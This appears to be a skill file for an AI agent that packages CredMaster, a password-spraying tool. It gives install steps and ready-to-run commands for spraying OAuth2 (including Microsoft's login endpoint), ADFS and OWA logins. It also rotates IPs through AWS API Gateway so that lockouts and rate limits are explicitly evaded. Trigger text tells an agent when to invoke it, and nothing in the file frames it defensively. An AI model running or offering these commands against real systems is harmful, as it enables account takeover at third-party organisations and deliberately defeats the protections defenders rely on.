---
name: credmaster-fireprox-spray
description: "CredMaster: Sprays passwords with rotating IPs via FireProx. Signals: password cracking, hash cracking, OAuth2 spraying, ADFS spraying, OWA spraying."
zh-signals: "CredMaster: FireProx 轮换 IP 喷洒。信号:密码破解,哈希破解,OAuth2 喷洒,ADFS 喷洒,OWA 喷洒。"
when-to-use: >-
  Use when performing password spraying against OAuth2, ADFS, or OWA endpoints
  and you need to rotate source IPs through AWS API Gateway (FireProx) to avoid
  lockout or rate limiting.
---

# CredMaster

- Attack Category: C25 Password and Hash Cracking
- Upstream Repository: https://github.com/knavesec/CredMaster
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/knavesec/CredMaster && cd CredMaster && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 credmaster.py --plugin oauth2 -u users.txt -p pass.txt --url https://login.microsoftonline.com` | OAuth2 spraying |
| `--plugin adfs -u u.txt -p p.txt --url https://adfs.t.com` | ADFS spraying |
| `--plugin owa -u u.txt -p p.txt --url https://mail.t.com` | OWA spraying |
| `--threads 5` | Threads |

## Attack Scenario Playbook

### Password spraying with FireProx IP rotation

```bash
python3 credmaster.py --plugin oauth2 -u emails.txt -p 'Pass123!' --accesskey AKIA...
# Every request goes through a new AWS API Gateway IP, bypassing IP rate limits
```

## Notes

Rotates egress IPs dynamically through AWS API Gateway (FireProx) for password spraying, greatly reducing the risk of being blocked.
